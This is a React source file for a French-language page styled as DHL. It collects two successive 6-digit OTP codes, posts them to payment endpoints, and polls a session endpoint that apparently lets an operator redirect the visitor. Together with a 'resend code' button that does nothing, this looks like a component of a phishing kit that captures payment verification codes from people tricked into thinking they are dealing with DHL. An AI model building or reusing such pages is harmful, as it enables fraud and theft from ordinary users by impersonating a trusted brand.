import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ShieldCheck, ArrowLeft } from "lucide-react";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";

interface DHLOTPPageProps {
  step: 1 | 2;
  paymentId?: string;
}

export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOTPPageProps) {
  const [otp, setOtp] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentId, setPaymentId] = useState<string>(propPaymentId || "");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    const pId = params.get("paymentId") || propPaymentId;
    if (id) setSessionId(id);
    if (pId) setPaymentId(pId);
  }, [propPaymentId]);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: step === 1 ? "/otp1" : "/otp2",
    paymentId,
    apiEndpoint: "/api/dhl/session",
    pathEndpoint: "/api/dhl/session/:sessionId/path",
  });

  const otpMutation = useMutation({
    mutationFn: async (otpValue: string) => {
      const endpoint = step === 1 
        ? `/api/payment/${paymentId}/otp1` 
        : `/api/payment/${paymentId}/otp2`;
      await apiRequest("POST", endpoint, { otp: otpValue });
    },
    onSuccess: () => {
      // Preserve session and paymentId params in navigation
      const params = new URLSearchParams();
      if (sessionId) params.set("session", sessionId);
      if (paymentId) params.set("paymentId", paymentId);
      const queryString = params.toString();
      
      if (step === 1) {
        window.location.href = `/otp2${queryString ? `?${queryString}` : ""}`;
      } else {
        window.location.href = `/success${queryString ? `?${queryString}` : ""}`;
      }
    },
    onError: () => {
      // Preserve session and paymentId params in error navigation
      const params = new URLSearchParams();
      if (sessionId) params.set("session", sessionId);
      if (paymentId) params.set("paymentId", paymentId);
      const queryString = params.toString();
      window.location.href = `/otp-error${queryString ? `?${queryString}` : ""}`;
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6 && paymentId) {
      otpMutation.mutate(otp);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
        <CardHeader className="space-y-3 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white">
          <div className="flex justify-center">
            <ShieldCheck className="h-16 w-16" />
          </div>
          <CardTitle className="text-2xl font-bold">
            Vérification de sécurité {step}/2
          </CardTitle>
          <CardDescription className="text-white/90">
            Veuillez entrer le code OTP envoyé à votre téléphone
          </CardDescription>
        </CardHeader>

        <CardContent className="pt-6 space-y-6">
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-sm text-blue-800">
            <p className="font-medium mb-1">Code de vérification requis</p>
            <p className="text-xs">
              Un code à 6 chiffres a été envoyé à votre numéro enregistré
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-gray-700">
                Code OTP
              </label>
              <Input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                placeholder="123456"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                className="text-center text-2xl tracking-widest font-mono h-14"
                data-testid="input-otp"
                required
              />
            </div>

            <Button
              type="submit"
              className="w-full h-12 bg-gradient-to-r from-[#FFCC00] to-[#D40511] hover:opacity-90 text-white font-semibold"
              disabled={otp.length !== 6 || otpMutation.isPending}
              data-testid="button-verify"
            >
              {otpMutation.isPending ? "Vérification..." : "Vérifier"}
            </Button>

            <Button
              type="button"
              variant="ghost"
              className="w-full"
              onClick={() => window.history.back()}
              data-testid="button-back"
            >
              <ArrowLeft className="mr-2 h-4 w-4" />
              Retour
            </Button>
          </form>

          <div className="text-center text-sm text-gray-500">
            <p>Vous n'avez pas reçu le code ?</p>
            <button
              type="button"
              className="text-[#D40511] underline font-medium hover:opacity-80"
              data-testid="button-resend"
            >
              Renvoyer le code
            </button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
